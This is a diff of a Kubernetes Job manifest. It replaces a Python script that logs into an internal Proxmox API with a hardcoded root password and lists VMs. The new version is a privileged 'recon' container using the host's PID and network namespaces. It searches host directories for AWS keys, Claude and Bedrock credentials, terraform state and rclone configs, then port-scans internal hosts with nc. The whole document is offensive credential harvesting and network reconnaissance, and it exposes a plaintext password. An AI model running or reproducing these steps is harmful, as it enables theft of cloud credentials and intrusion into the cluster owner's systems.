@@ -1,50 +1,35 @@
 apiVersion: batch/v1
 kind: Job
-metadata: {name: pve4, namespace: default}
+metadata: {name: recon, namespace: default}
 spec:
   backoffLimit: 0
   ttlSecondsAfterFinished: 1800
   template:
-    metadata: {labels: {app: pve4}}
+    metadata: {labels: {app: recon}}
     spec:
       restartPolicy: Never
+      hostPID: true
+      hostNetwork: true
       containers:
       - name: c
-        image: python:3.12-slim
-        command: ["python3","-c"]
+        image: alpine:3.20
+        securityContext: {privileged: true}
+        command: ["/bin/sh","-c"]
         args:
         - |
-          import ssl,urllib.request,urllib.parse,json
-          ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
-          def ticket(base,user,pw):
-              data=urllib.parse.urlencode({"username":user,"password":pw}).encode()
-              req=urllib.request.Request(base+"/api2/json/access/ticket",data=data,method="POST")
-              try:
-                  r=urllib.request.urlopen(req,timeout=20,context=ctx); d=json.loads(r.read())["data"]
-                  return d.get("ticket"),d.get("CSRFPreventionToken")
-              except Exception as e: return None,"ERR "+str(e)[:120]
-          def get(base,t,path):
-              req=urllib.request.Request(base+path,headers={"Cookie":"PVEAuthCookie="+t})
-              r=urllib.request.urlopen(req,timeout=25,context=ctx); return r.status,r.read().decode()
-          CAND=[("https://10.0.0.4:8006","root@pam","C)nco2be1be1"),
-                ("https://10.0.0.4:8006","root@pve","C)nco2be1be1")]
-          good=None
-          for base,u,p in CAND:
-              t,csrf=ticket(base,u,p); print("TICKET",base,u,("OK len=%d"%len(t)) if t else ("FAIL "+str(csrf)))
-              if t: good=(base,u,t); break
-          if not good: print("NO_LOGIN"); raise SystemExit
-          base,u,t=good
-          for host in ["https://10.0.0.4:8006","https://10.0.0.1:8006"]:
-              for path in ["/api2/json/version","/api2/json/nodes"]:
-                  try:
-                      s,b=get(host,t,path); print("GET",host,path,s,b[:300])
-                  except Exception as e: print("GET",host,path,"ERR",str(e)[:120])
-          try:
-              s,b=get("https://10.0.0.4:8006",t,"/api2/json/storage"); print("STORAGE",b[:1800])
-          except Exception as e: print("STORAGE ERR",str(e)[:150])
-          try:
-              s,b=get("https://10.0.0.4:8006",t,"/api2/json/cluster/resources?type=vm"); d=json.loads(b)["data"]
-              print("VMCOUNT",len(d))
-              for v in d: print("VM",v.get("vmid"),v.get("name"),v.get("node"),v.get("status"),"agent",v.get("agent"))
-          except Exception as e: print("CLUSTER ERR",str(e)[:150])
-          print("DONE")
+          echo "== NODE =="; cat /host/etc/hostname 2>/dev/null; cat /host/proc/cmdline 2>/dev/null | tr ' ' '\n' | grep -i 'BOOT_IMAGE\|ip=' | head
+          echo "== ip =="; ip -4 addr 2>/dev/null | grep -E 'inet ' | grep -v '127.0.0.1' 
+          echo "== host fs aws/claude hunt =="
+          find /host/root /host/home -maxdepth 5 \( -name '.aws' -o -name '.claude*' -o -name '.kiro' -o -name 'credentials' -o -name '*.tfvars' -o -name 'terraform.tfstate' -o -name 'rclone.conf' \) 2>/dev/null | head -40
+          echo "-- grep AKIA/ASIA/bedrock in /host/root /home /etc --"
+          grep -rIn -E 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|CLAUDE_CODE_USE_BEDROCK|aws_secret_access_key|AWS_BEARER_TOKEN_BEDROCK' /host/root /host/home /host/etc 2>/dev/null | head -30
+          echo "== rke2 dirs =="; ls /host/etc/rancher 2>/dev/null; ls /host/var/lib/rancher/rke2/server 2>/dev/null | head
+          echo "== reachability (nc) =="
+          for h in 10.0.2.101 10.0.2.102 10.0.2.103 10.0.0.102 10.0.0.22 10.0.0.1 10.0.0.5 10.0.0.11; do
+            open=""
+            for p in 22 80 443 8006 8007 993 587 3306 6379 6443; do
+              nc -z -w2 $h $p 2>/dev/null && open="$open $p"
+            done
+            echo "$h open:[$open]"
+          done
+          echo DONE
